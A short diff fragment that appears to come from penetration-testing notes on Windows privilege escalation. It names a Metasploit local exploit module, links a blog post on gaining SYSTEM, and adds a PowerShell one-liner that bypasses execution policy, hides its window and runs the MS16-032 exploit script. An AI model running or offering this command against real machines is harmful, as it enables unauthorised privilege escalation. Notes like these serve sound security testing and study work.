@@ -30,3 +30,10 @@ Also works for exploit: exploit/windows/local/ps_wmi_exec
 
 
 Administrator: X
+
+
+https://decoder.cloud/2017/02/21/the-system-challenge/
+Decoder's Blog Decoder
+The “SYSTEM” challenge
+ 
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command { Import-Module .\ms16_032.ps1 ; Invoke-MS16-032}
